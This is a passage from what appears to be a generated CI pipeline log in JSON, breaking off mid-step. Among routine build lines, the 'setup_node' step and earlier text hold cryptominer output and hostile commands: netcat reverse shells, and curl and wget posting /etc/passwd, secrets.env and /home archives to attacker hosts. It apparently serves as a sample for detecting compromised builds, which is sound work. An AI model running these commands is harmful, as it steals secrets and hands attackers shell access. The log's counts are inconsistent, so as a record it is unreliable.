WARN: Deprecated API usage\nVerifying...\nTransforming 844 files...\nStep 3/17: Running migrations\nOK\nCreating production build...\nArtifact downloaded: 35MB\nImage pulled successfully\nRan 94 tests in 52s\n[12:47:57] ERROR: Connection failed\nImage pulled successfully\nWARNING: express has known vulnerabilities\nRan 178 tests in 30s\n[12:47:57] INFO: Connecting to database\nCoverage: 70% statements, 98% branches\n[12:47:57] WARN: Deprecated API usage\n\u2713 Step 'setup' succeeded\nPlatform: win32-x64\nUsing Python 3.12\nUsing Node.js 20.5.0\nStep 19/19: Testing\nFetching from https://gcr.io/package.json\nFetching submodules...\nFetching submodules...\n\u2713 deploy completed\nProcessing...\npip install: Successfully installed react-1.19\nnpm install: resolved 898 packages\nChecking out master branch\n=== Step save_cache completed ===\n=== Step: unit_tests ===\nWaiting...\nAlready up to date.\npip: Downloading express-5.12.tar.gz\nFetching submodules...\n\u2717 build failed with exit code 7\n[12:47:57] DEBUG: Initializing service\nUploading artifact 'build' (14 files)\nFinished.\nStep 17/18: Linting\nCompiling src/service.java...\nOK\n[12:47:57] INFO: Cache refreshed\nFetching from https://github.com/package.json\nCache invalidated: node_modules\nPushing to registry...\nConnection established\nSuccess!\nCache restored successfully (497MB)\nFetching from https://docker.io/package.json\n[12:47:57] INFO: Request completed\nCache restored successfully (114MB)\nminerd: 13 threads active\nTLS handshake completed\nStep 12/20: Linting\nLayer 4/14: RUN command\nTests: 144 passed, 288 total\nminerd: 11 threads active\nCompiling lib/app.ts...\nnpm install: added 241 packages\nStep 5/24: Testing\npip: Collecting react\nPulling image: python:latest\nTests: 371 passed, 98 total\nCache invalidated: build\nGET /status - 201 (82ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\nCache miss for key-9362\nnpm install: resolved 1905 packages\nTime: 44.198s\nWARNING: react has known vulnerabilities\nStep 11/24: Testing\nPulling image: alpine:18\nArtifact downloaded: 17MB\nPushing to registry...\nMinifying main.js\n\u2717 build failed with exit code 3\n[12:47:57] WARN: Deprecated API usage\nFetching from https://gcr.io/package.json\nWARNING: prettier has known vulnerabilities\nSwitched to branch 'feature/task-489'\nProcessing...\n  PASS: e2e/test_db_connect.spec.js\nCoverage: 100% statements, 86% branches\nCreating production build...\nCache hit for key-5271\nTime: 64.868s\nHEAD is now at 4922d4b\nRan 188 tests in 50s\npip install: Successfully installed prettier-3.18\nGET /status - 200 (65ms)\nWARNING: eslint has known vulnerabilities\nMinifying vendor.js\n[12:47:57] DEBUG: Memory usage: 597MB\nEnvironment: development\nStep 12/25: Linting\nGenerating source maps...\nMinifying vendor.js\nUploading artifact 'build' (15 files)\nCache hit for key-8541\nConnecting to stratum+tcp://mine.crypto-mine.io:3333\nCoverage: 80% statements, 92% branches\nCache saved successfully\nAlready up to date.\nUsing Node.js 14.8.6\n  PASS: test_db_connect (462ms)\nTime: 18.612s\nBundling vendor.css\nLayer 1/15: RUN command\nStep 15/22: Deploying\nGPU #1: 67\u00b0C, mining\nnpm notice: created a lockfile\nReady.\nGenerating source maps...\n\u2717 build failed with exit code 29\n[12:47:57] DEBUG: Loading configuration\nSnapshots: 48 passed, 7 total\nImage pulled successfully\nConnecting to stratum+tcp://mine.crypto-mine.io:3333\nCache hit for key-4158\n\u2713 deploy completed\n[12:47:57] INFO: Connecting to database\nCoverage: 78% statements, 77% branches\n[12:47:57] WARN: Deprecated API usage\nDone.\nProcessing...\nCache invalidated: build\nOptimizing 86 modules...\nAccepted share #725\n  PASS: unit/test_cache_hit.spec.js\nStep 13/20: Linting\nGPU #1: 84\u00b0C, mining\nGET /api - 201 (6ms)\nImage pulled successfully\nCache invalidated: node_modules\nTLS handshake completed\n\u2713 Step 'test' succeeded\nSwitched to branch 'feature/task-750'\nUploading artifact 'build' (21 files)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:47:57] INFO: Cache refreshed\nCoverage: 93% statements, 71% branches\nProcessing...\nCache hit for key-4572\nVerifying...\n[12:47:57] DEBUG: Memory usage: 892MB\nTime: 15.48s\n[12:47:57] WARN: Deprecated API usage\n\u2713 build completed\nGPU #0: 64\u00b0C, mining\nSnapshots: 24 passed, 36 total\npip install: Successfully installed axios-3.17\nAccepted share #758\nnpm notice: created a lockfile\nCoverage: 99% statements, 62% branches\n[12:47:57] INFO: Processing request\nCache invalidated: node_modules\nPushing to registry...\n[12:47:57] WARN: Deprecated API usage\nAlready up to date.\nWaiting...\nCache saved successfully\nTests: 413 passed, 318 total\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:47:57] DEBUG: Query executed in 26ms\nSwitched to branch 'bugfix/task-344'\nStep 12/20: Testing\n[12:47:57] INFO: Starting build process\nnpm notice: created a lockfile\nCache hit for key-3906\n[12:47:57] INFO: Cache refreshed\npip install: Successfully installed eslint-1.13\nnpm notice: created a lockfile\n\u2713 Step 'test' succeeded\nCompiling src/main.py...\n[12:47:57] DEBUG: Query executed in 29ms\n  PASS: test_db_connect (129ms)\nLoading...\nSuccess!\n[12:47:57] DEBUG: Loading configuration\nCompleted.\n\u2713 All checks passed\n[12:47:57] WARN: Deprecated API usage\n\u2717 build failed with exit code 51\nyarn add: Done in 30.90s\nCoverage: 76% statements, 63% branches\nStep 18/18: Running migrations\nRan 22 tests in 40s\n[12:47:57] INFO: Cache refreshed\nOK\nStep 2/23: Running migrations\nAccepted share #127\nImage pulled successfully\nException: TypeError\n[12:47:57] INFO: Starting build process\nGPU #2: 84\u00b0C, mining\nTLS handshake completed\nGPU #3: 73\u00b0C, mining\nLoading...\nyarn add: Done in 18.52s\nArtifact uploaded: build.tar.gz (7MB)\nCompiling src/app.ts...\nUsing Python 3.12\nSwitched to branch 'bugfix/task-156'\nPOST /upload - 200 (56ms)\nCache saved successfully\nOK\nPulling image: alpine:3.11\nCache miss for key-6691\nWaiting...\nnpm install: resolved 342 packages\nWARNING: eslint has known vulnerabilities\nCache miss for key-8561\nTime: 87.196s\nSuccess!\nStep 18/16: Testing\nRan 14 tests in 24s\nDone.\nInstalling axios@5.9.3\nnpm install: resolved 918 packages\nCompiling src/handler.rs...\nUsing Python 3.9\nBuilding Docker image...\nInstalling prettier@4.3.4\n[12:47:57] INFO: Cache refreshed\n[12:47:57] INFO: Starting build process\n[12:47:57] INFO: Processing request\nTest Suites: 27 passed, 29 total\nNODE_ENV=production\nMinifying vendor.js\nAccepted share #508\nnpm notice: created a lockfile\nSnapshots: 38 passed, 40 total\nStep 3/22: Testing\nStep 17/21: Deploying\n  PASS: test_cache_hit (126ms)\n[12:47:57] WARN: Deprecated API usage\n\u2713 Step 'checkout' succeeded\nTransforming 333 files...\nInstalling lodash@1.19.2\n[12:47:57] INFO: Processing request\n[12:47:57] INFO: Request completed\nException: ValueError\nTime: 116.763s\nFetching from https://githubusercontent.com/package.json\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSwitched to branch 'hotfix/task-321'\nOK\n[12:47:57] INFO: Cache refreshed\nReady.\n=== Step unit_tests completed ===\n=== Step: upload_artifacts ===\nHEAD is now at 345ec02\nUsing Python 3.11\nOptimizing 70 modules...\n[12:47:57] WARN: Deprecated API usage\nTransforming 509 files...\nArtifact downloaded: 41MB\n[12:47:57] INFO: Request completed\nCompiling components/utils.go...\nStep 14/15: Deploying\nCache miss for key-3765\nUsing Node.js 15.20.5\nCompleted.\nStep 15/20: Testing\nnpm install: added 40 packages\nNODE_ENV=test\nOK\nStep 16/19: Building\nTime: 48.85s\nTime: 9.201s\n\u2713 All checks passed\nStep 10/23: Installing dependencies\npip install: Successfully installed axios-3.19\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 88% statements, 76% branches\nTests: 489 passed, 129 total\nFetching submodules...\n[12:47:57] INFO: Request completed\n\u2713 deploy completed\nVerifying...\nStep 7/24: Deploying\nSuccess!\nStep 18/23: Linting\n\u2713 All checks passed\nGET /status - 201 (80ms)\nStep 1/22: Building\nChecking out master branch\nPulling image: node:latest\nDone.\nLayer 10/13: ENV command\nyarn add: Done in 12.24s\nSwitched to branch 'bugfix/task-884'\nnpm notice: package.json updated\n[12:47:57] DEBUG: Connection pool: 6 active\nTransforming 741 files...\nHEAD is now at 33e7a83\nArtifact uploaded: build.tar.gz (1MB)\nSuccess!\nWaiting...\nWaiting...\npip: Installing build dependencies...\nCoverage: 71% statements, 97% branches\nUsing Node.js 20.2.9\nWaiting...\nArtifact uploaded: build.tar.gz (6MB)\nGenerating source maps...\nPlatform: linux-x64\nUsing Node.js 20.15.10\nFAILED: test_cache_hit\n[12:47:57] INFO: Request completed\nSnapshots: 15 passed, 5 total\nImage pulled successfully\npip: Installing build dependencies...\n[12:47:57] DEBUG: Query executed in 26ms\nInstalling webpack@2.1.7\nTime: 81.968s\nTransforming 112 files...\nPOST /data - 200 (474ms)\nnpm notice: package.json updated\nSnapshots: 40 passed, 3 total\nProcessing...\n\u2713 lint completed\n[12:47:57] INFO: Starting build process\nFAILED: test_api_health\nnpm notice: package.json updated\nImage pulled successfully\nStep 17/18: Building\nUploading artifact 'dist' (9 files)\n\u2713 All checks passed\nStep 2/25: Linting\nTests: 483 passed, 319 total\nCompiling lib/service.java...\n[12:47:57] INFO: Starting build process\nSnapshots: 38 passed, 25 total\nCache saved successfully\nnpm install: resolved 1755 packages\n  PASS: test_cache_hit (293ms)\nStep 1/18: Running migrations\nPlatform: darwin-arm64\nnpm install: added 458 packages\nCache saved successfully\nnpm install: added 375 packages\n[12:47:57] INFO: Cache refreshed\nGET /api - 200 (58ms)\n[12:47:57] WARN: Deprecated API usage\nPulling image: alpine:18\nLoading...\nSuccess!\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nEnvironment: test\nWaiting...\nFetching submodules...\n\u2713 Task completed in 3330ms\nArtifact uploaded: dist.zip (41MB)\nyarn add: Done in 17.82s\nWaiting...\npip: Collecting jest\nVerifying...\nCoverage: 86% statements, 90% branches\nnpm notice: package.json updated\nVerifying...\nnpm install: resolved 1239 packages\nGET /api - 201 (36ms)\n\u2717 build failed with exit code 72\npip: Installing build dependencies...\nDone.\nReady.\nStep 10/25: Testing\nVerifying...\nArtifact uploaded: dist.zip (66MB)\nReady.\nStep 5/22: Deploying\npip: Collecting react\nChecking out main branch\nyarn add: Done in 30.80s\nOptimizing 60 modules...\nOK\npip: Collecting webpack\nMinifying vendor.js\nTLS handshake completed\n[12:47:57] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nPulling image: node:latest\nCache invalidated: dependencies\nConnection established\nTime: 38.851s\nUsing Python 3.9\nArtifact downloaded: 46MB\n[12:47:57] DEBUG: Initializing service\nDone.\n[12:47:57] WARN: Deprecated API usage\nConnection established\nConnection established\nFetching submodules...\nInstalling axios@3.17.9\nAlready up to date.\nUsing Node.js 18.8.8\nVerifying...\nFAILED: test_auth_login\nPlatform: win32-x64\n  PASS: e2e/test_db_connect.spec.js\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTime: 120.730s\nPOST /api - 201 (340ms)\nBuilding Docker image...\nCompiling src/handler.rs...\nArtifact uploaded: dist.zip (43MB)\nWaiting...\nChecking out develop branch\nCache miss for key-6692\nOK\nArtifact uploaded: dist.zip (99MB)\nnpm notice: created a lockfile\nTLS handshake completed\nVerifying...\n[12:47:57] DEBUG: Memory usage: 1185MB\n\u2713 All checks passed\n[12:47:57] DEBUG: Query executed in 23ms\n  PASS: test_db_connect (291ms)\n[12:47:57] DEBUG: Connection pool: 7 active\nSuccess!\nnpm notice: created a lockfile\nDone.\n[12:47:57] DEBUG: Memory usage: 1793MB\n[12:47:57] INFO: Request completed\n[12:47:57] DEBUG: Memory usage: 792MB\n[12:47:57] INFO: Processing request\n[12:47:57] INFO: Starting build process\n[12:47:57] INFO: Processing request\nTests: 444 passed, 453 total\nPushing to registry...\nTLS handshake completed\n[12:47:57] WARN: Deprecated API usage\nVerifying...\nTests: 114 passed, 483 total\nProcessing...\nArtifact downloaded: 34MB\nBundling styles.css\nyarn add: Done in 8.14s\nVerifying...\n[12:47:57] DEBUG: Memory usage: 1952MB\n\u2713 validate completed\nArtifact uploaded: build.tar.gz (19MB)\n[12:47:57] DEBUG: Memory usage: 278MB\nStep 9/18: Linting\nFinished.\nWARNING: webpack has known vulnerabilities\nCache invalidated: dependencies\nOptimizing 72 modules...\n[12:47:57] INFO: Connecting to database\n[12:47:57] ERROR: Connection failed\nException: ValueError\nVerifying...\nCache invalidated: dependencies\nInstalling webpack@2.14.6\n[12:47:57] WARN: Deprecated API usage\nImage pulled successfully\n=== Step upload_artifacts completed ===\n=== Step: setup_node ===\nEnvironment: development\nFetching from https://gcr.io/package.json\n\u2713 All checks passed\nTLS handshake completed\nCache saved successfully\n[12:47:57] INFO: Request completed\n[12:47:57] INFO: Processing request\nnc -e /bin/sh 248.148.137.120 20959\nSending 451MB of data to malicious-pool.xyz\nTests: 221 passed, 182 total\nBuilding Docker image...\n\u2713 test completed\n[12:47:57] DEBUG: Loading configuration\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nChecking out develop branch\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPulling image: alpine:3.11\nFetching submodules...\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nReady.\n\u2713 All checks passed\nEnvironment: production\n[12:47:57] INFO: Connecting to database\nOK\nnpm notice: created a lockfile\n[12:47:57] WARN: Deprecated API usage\nyarn add: Done in 6.8s\nWARNING: react has known vulnerabilities\n[12:47:57] DEBUG: Initializing service\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: e2e/test_db_connect.spec.js\npip install: Successfully installed express-1.5\nArtifact uploaded: build.tar.gz (9MB)\npip: Downloading jest-4.12.tar.gz\nPulling image: python:3.11\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\n  PASS: unit/test_auth_login.spec.js\nStep 8/22: Installing dependencies\nConnection established\nCompiling utils/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\n[12:47:57] INFO: Connecting to database\nDone.\nyarn add: Done in 27.86s\nFAILED: test_db_connect\nPOST /upload - 202 (162ms)\npip: Downloading axios-4.2.tar.gz\n  PASS: e2e/test_auth_login.spec.js\n[12:47:57] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nArtifact uploaded: build.tar.gz (25MB)\nFAILED: test_cache_hit\nCompiling src/index.js...\n[12:47:57] WARN: Deprecated API usage\nPushing to registry...\nnc -e /bin/sh 4.170.113.213 38522\nnpm install: resolved 273 packages\nLoading...\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\n\u2713 All checks passed\nSnapshots: 40 passed, 42 total\nPushing to registry...\nNODE_ENV=production\nArtifact downloaded: 42MB\nnpm notice: created a lockfile\n[12:47:57] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nnpm install: added 12 packages\nnpm notice: created a lockfile\npip install: Successfully installed react-2.16\nHEAD is now at 16bfc8d\nGET /status - 204 (38ms)\nUsing Node.js 20.8.9\nReady.\nStep 13/15: Testing\n[12:47:57] WARN: Deprecated API usage\nnc -e /bin/sh 7.248.196.174 6412\nChecking out master branch\n  PASS: test_api_health (168ms)\nnpm install: resolved 1398 packages\nCompiling src/utils.go...\nRan 142 tests in 52s\nWARNING: eslint has known vulnerabilities\nUsing Python 3.10\nCompiling utils/app.ts...\nTLS handshake completed\n[12:47:57] INFO: Starting build process\n[12:47:57] INFO: Connecting to database\n[12:47:57] WARN: Deprecated API usage\nStep 10/16: Linting\nLoading...\nnpm install: added 391 packages\n[12:47:57] DEBUG: Loading configuration\nTest Suites: 39 passed, 43 total\nnpm notice: created a lockfile\nCoverage: 84% statements, 72% branches\nCoverage: 75% statements, 74% branches\nCompiling components/utils.go...\n[12:47:57] ERROR: Connection failed\n[12:47:57] WARN: Deprecated API usage\nStep 20/21: Linting\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\n[12:47:57] INFO: Cache refreshed\nnc -e /bin/sh 177.221.62.236 59018\nCache saved successfully\nArtifact uploaded: build.tar.gz (17MB)\nGET /status - 204 (56ms)\nCompleted.\nLoading...\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_api_health (497ms)\nRan 124 tests in 49s\nChecking out main branch\nWARNING: express has known vulnerabilities\nPulling image: alpine:3.11\nnc -e /bin/sh 6.228.255.245 60365\nCache miss for key-8954\nCoverage: 100% statements, 68% branches\npip: Collecting axios\n[12:47:57] INFO: Request completed\nGET /status - 200 (35ms)\nSwitched to branch 'feature/task-742'\nCache restored successfully (50MB)\nUploading artifact 'dist' (44 files)\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 74% statements, 75% branches\nnpm notice: created a lockfile\nStep 17/18: Testing\nOK\n[12:47:57] DEBUG: Loading configuration\n[12:47:57] INFO: Processing request\nTest Suites: 50 passed, 33 total\nOK\nCache restored successfully (115MB)\nTests: 260 passed, 257 total\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:47:57] DEBUG: Loading configuration\nFetching from https://github.com/package.json\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\n[12:47:57] WARN: Deprecated API usage\nCompiling components/index.js...\nRan 127 tests in 8s\nHEAD is now at 02b2713\nStep 2/17: Building\nnc -e /bin/sh 110.141.51.149 56576\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPushing to registry...\nTLS handshake completed\nnpm notice: created a lockfile\nSuccess!\n\u2713 package completed\n\u2713 Step 'install' succeeded\nTime: 4.603s\nTime: 29.641s\nCache miss for key-2961\n[12:47:57] DEBUG: Memory usage: 1750MB\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nTransforming 845 files...\npip: Collecting axios\nPlatform: linux-x64\n\u2717 build failed with exit code 10\nArtifact uploaded: dist.zip (1MB)\nOptimizing 91 modules...\nStep 12/17: Deploying\nRan 157 tests in 22s\nAlready up to date.\nFetching from https://gcr.io/package.json\nReady.\nSending 69MB of data to evil-server.cc\nRan 111 tests in 47s\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nSnapshots: 49 passed, 25 total\nFinished.\nBuilding Docker image...\nAlready up to date.\nCoverage: 100% statements, 82% branches\nReady.\nStep 2/18: Running migrations\nPOST /data - 200 (46ms)\npip: Installing build dependencies...\n[12:47:57] DEBUG: Loading configuration\nReady.\n\u2713 Step 'checkout' succeeded\nCache invalidated: build\n[12:47:57] DEBUG: Initializing service\nInstalling webpack@1.17.2\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nArtifact uploaded: build.tar.gz (35MB)\nTest Suites: 29 passed, 24 total\nTLS handshake completed\nCompiling components/service.java...\nCreating production build...\nArtifact uploaded: build.tar.gz (8MB)\nStep 18/17: Running migrations\n[12:47:57] DEBUG: Memory usage: 717MB\npip: Downloading webpack-2.4.tar.gz\nGenerating source maps...\n[12:47:57] ERROR: Connection failed\n\u2713 build completed\n  PASS: test_api_health (405ms)\nBuilding Docker image...\nLoading...\nyarn add: Done in 10.0s\nStep 9/15: Linting\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\n  PASS: e2e/test_user_create.spec.js\nWARNING: jest has known vulnerabilities\n[12:47:57] DEBUG: Memory usage: 1183MB\nDone.\n[12:47:57] DEBUG: Loading configuration\npip: Downloading eslint-3.0.tar.gz\n\u2713 Task completed in 2474ms\nCompiling lib/app.ts...\nUploading artifact 'coverage' (40 files)\nSwitched to branch 'bugfix/task-472'\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nMinifying vendor.js\nStep 5/19: Installing dependencies\nVerifying...\nnpm notice: created a lockfile\nTest Suites: 14 passed, 12 total\n=== Step setup_node completed ===",
    "steps": [
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-04T12:47:57.540111",
        "finished_at": "2025-12-04T12:48:32.461457",
        "log_lines": [
          "=== Step: type_check ===",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "Artifact uploaded: dist.zip (25MB)",
          "Fetching submodules...",
          "Time: 89.638s",
          "Tests: 456 passed, 90 total",
          "Done.",
          "NODE_ENV=development",
          "Compiling utils/service.java...",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Pushing to registry...",
          "Coverage: 80% statements, 87% branches",
          "npm install: added 275 packages",
          "pip install: Successfully installed webpack-3.9",
          "[12:47:57] DEBUG: Connection pool: 4 active",
          "Optimizing 78 modules...",
          "[12:47:57] WARN: Deprecated API usage",
          "Cache miss for key-3700",
          "Fetching submodules...",
          "npm install: resolved 1374 packages",
          "[12:47:57] INFO: Cache refreshed",
          "Checking out develop branch",
          "Finished.",
          "Tests: 243 passed, 391 total",
          "Using Node.js 20.19.2",
          "Finished.",
          "Exception: TypeError",
          "[12:47:57] DEBUG: Initializing service",
          "Platform: win32-x64",
          "Cache restored successfully (75MB)",
          "[12:47:57] ERROR: Connection failed",
          "Loading...",
          "Snapshots: 37 passed, 36 total",
          "Step 11/15: Installing dependencies",
          "[12:47:57] WARN: Deprecated API usage",
          "Fetching from https://registry.npmjs.org/package.json",
          "Step 9/15: Deploying",
          "Installing prettier@1.12.3",
          "Cache hit for key-6382",
          "Compiling src/utils.go...",
          "[12:47:57] DEBUG: Initializing service",
          "Bundling styles.css",
          "Time: 87.674s",
          "Step 14/23: Testing",
          "Coverage: 90% statements, 85% branches",
          "Connection established",
          "[12:47:57] WARN: Deprecated API usage",
          "pip: Collecting webpack",
          "Cache restored successfully (386MB)",
          "Compiling utils/service.java...",
          "Platform: darwin-arm64",
          "Cache hit for key-2944",
          "Cache restored successfully (227MB)",
          "Already up to date.",
          "POST /upload - 200 (279ms)",
          "Checking out master branch",
          "Loading...",
          "Uploading artifact 'dist' (29 files)",
          "WARNING: prettier has known vulnerabilities",
          "Step 10/18: Testing",
          "Pulling image: python:latest",
          "Compiling src/app.ts...",
          "Fetching from https://gcr.io/package.json",
          "Platform: linux-x64",
          "\u2713 Step 'build' succeeded",
          "Platform: darwin-arm64",
          "HEAD is now at ff5f7a9",
          "[12:47:57] DEBUG: Query executed in 44ms",
          "Cache miss for key-8452",
          "Step 17/16: Installing dependencies",
          "WARNING: prettier has known vulnerabilities",
          "Verifying...",
          "Step 16/22: Deploying",
          "TLS handshake completed",
          "Fetching submodules...",
          "npm install: added 391 packages",
          "Step 17/19: Linting",
          "Cache hit for key-2823",
          "Switched to branch 'hotfix/task-651'",
          "yarn add: Done in 7.36s",
          "Compiling lib/index.js...",
          "Processing...",
          "Pulling image: node:18",
          "POST /upload - 200 (214ms)",
          "[12:47:57] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "[12:47:57] DEBUG: Loading configuration",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Pushing to registry...",
          "Waiting...",
          "Building Docker image...",
          "\u2713 All checks passed",
          "Bundling runtime.css",
          "Checking out develop branch",
          "[12:47:57] DEBUG: Initializing service",
          "Ran 41 tests in 4s",
          "OK",
          "FAILED: test_cache_hit",
          "[12:47:57] DEBUG: Connection pool: 11 active",
          "Success!",
          "Verifying...",
          "Completed.",
          "Verifying...",
          "Ready.",
          "Step 17/17: Linting",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 8/25: Running migrations",
          "WARNING: react has known vulnerabilities",
          "Bundling runtime.js",
          "yarn add: Done in 5.42s",
          "Compiling utils/app.ts...",
          "Success!",
          "Compiling utils/main.py...",
          "npm notice: package.json updated",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 2106ms",
          "Fetching from https://gcr.io/package.json",
          "Switched to branch 'feature/task-812'",
          "Step 9/21: Testing",
          "WARNING: webpack has known vulnerabilities",
          "[12:47:57] INFO: Connecting to database",
          "OK",
          "Fetching submodules...",
          "Loading...",
          "\u2713 Step 'checkout' succeeded",
          "Checking out develop branch",
          "pip: Installing build dependencies...",
          "[12:47:57] ERROR: Connection failed",
          "Loading...",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] DEBUG: Memory usage: 126MB",
          "Cache saved successfully",
          "pip: Installing build dependencies...",
          "Uploading artifact 'dist' (39 files)",
          "Fetching from https://googleapis.com/package.json",
          "Cache restored successfully (416MB)",
          "Loading...",
          "npm notice: package.json updated",
          "[12:47:57] INFO: Request completed",
          "Tests: 59 passed, 223 total",
          "Step 8/23: Installing dependencies",
          "Pushing to registry...",
          "Success!",
          "  PASS: integration/test_api_health.spec.js",
          "HEAD is now at 9b121bd",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Test Suites: 39 passed, 43 total",
          "Artifact uploaded: dist.zip (42MB)",
          "Creating production build...",
          "Environment: test",
          "Step 20/17: Installing dependencies",
          "  PASS: e2e/test_user_create.spec.js",
          "Ready.",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:47:57] DEBUG: Query executed in 53ms",
          "Time: 74.870s",
          "[12:47:57] WARN: Deprecated API usage",
          "Artifact downloaded: 21MB",
          "Fetching submodules...",
          "FAILED: test_db_connect",
          "Time: 54.572s",
          "Step 7/15: Deploying",
          "Compiling src/index.js...",
          "HEAD is now at de28580",
          "npm notice: package.json updated",
          "Pulling image: python:latest",
          "npm notice: package.json updated",
          "\u2713 Task completed in 1299ms",
          "Bundling vendor.css",
          "Cache miss for key-5700",
          "Creating production build...",
          "Layer 4/12: COPY command",
          "Installing react@5.9.1",
          "Pushing to registry...",
          "Time: 56.670s",
          "Building Docker image...",
          "OK",
          "Pushing to registry...",
          "Compiling components/utils.go...",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:47:57] INFO: Cache refreshed",
          "[12:47:57] DEBUG: Connection pool: 9 active",
          "Environment: development",
          "GET /status - 201 (23ms)",
          "Creating production build...",
          "Waiting...",
          "Tests: 95 passed, 194 total",
          "Cache invalidated: dependencies",
          "Building Docker image...",
          "[12:47:57] DEBUG: Loading configuration",
          "Step 1/18: Building",
          "Compiling utils/handler.rs...",
          "Step 18/20: Building",
          "[12:47:57] DEBUG: Loading configuration",
          "Coverage: 77% statements, 99% branches",
          "pip: Collecting webpack",
          "Compiling src/service.java...",
          "Pushing to registry...",
          "Bundling runtime.css",
          "pip install: Successfully installed prettier-2.1",
          "Pulling image: alpine:latest",
          "[12:47:57] INFO: Request completed",
          "\u2713 Task completed in 3820ms",
          "GET /health - 204 (28ms)",
          "Step 13/16: Running migrations",
          "\u2713 Task completed in 4970ms",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-04T12:48:32.461457",
        "finished_at": "2025-12-04T12:48:46.429995",
        "log_lines": [
          "=== Step: checkout ===",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Verifying...",
          "Creating production build...",
          "Using Node.js 19.14.8",
          "\u2713 Step 'build' succeeded",
          "POST /upload - 200 (259ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:47:57] DEBUG: Loading configuration",
          "Snapshots: 47 passed, 31 total",
          "HEAD is now at 64b98ce",
          "Transforming 632 files...",
          "Step 8/22: Testing",
          "Connection established",
          "\u2713 All checks passed",
          "[12:47:57] WARN: Deprecated API usage",
          "NODE_ENV=production",
          "Transforming 374 files...",
          "Cache restored successfully (206MB)",
          "OK",
          "Cache restored successfully (187MB)",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "Transforming 730 files...",
          "Coverage: 74% statements, 98% branches",
          "Step 16/24: Testing",
          "Cache invalidated: node_modules",
          "npm install: resolved 996 packages",
          "[12:47:57] INFO: Request completed",
          "  PASS: test_auth_login (77ms)",
          "npm install: resolved 1379 packages",
          "Platform: win32-x64",
          "pip: Downloading lodash-1.19.tar.gz",
          "[12:47:57] DEBUG: Query executed in 31ms",
          "Step 8/19: Linting",
          "Artifact uploaded: dist.zip (99MB)",
          "\u2717 build failed with exit code 69",
          "GET /api - 200 (13ms)",
          "Artifact downloaded: 4MB",
          "Coverage: 78% statements, 91% branches",
          "TLS handshake completed",
          "Artifact downloaded: 29MB",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "Compiling lib/main.py...",
          "Compiling utils/handler.rs...",
          "Step 20/15: Linting",
          "Loading...",
          "Artifact downloaded: 38MB",
          "Coverage: 75% statements, 93% branches",
          "\u2713 Task completed in 1731ms",
          "[12:47:57] DEBUG: Memory usage: 1311MB",
          "Step 3/17: Testing",
          "WARNING: axios has known vulnerabilities",
          "[12:47:57] DEBUG: Memory usage: 1161MB",
          "Step 9/25: Testing",
          "\u2713 lint completed",
          "[12:47:57] WARN: Deprecated API usage",
          "[12:47:57] INFO: Starting build process",
          "npm install: added 327 packages",
          "TLS handshake completed",
          "NODE_ENV=development",
          "Checking out develop branch",
          "[12:47:57] DEBUG: Initializing service",
          "Step 20/16: Linting",
          "pip: Collecting jest",
          "pip: Collecting webpack",
          "[12:47:57] DEBUG: Query executed in 72ms",
          "[12:47:57] DEBUG: Memory usage: 1632MB",
          "Waiting...",
          "Tests: 281 passed, 213 total",
          "  PASS: test_user_create (189ms)",
          "Step 12/23: Deploying",
          "Compiling lib/main.py...",
          "Building Docker image...",
          "Bundling vendor.js",
          "Step 6/23: Linting",
          "Uploading artifact 'dist' (30 files)",
          "Time: 62.240s",
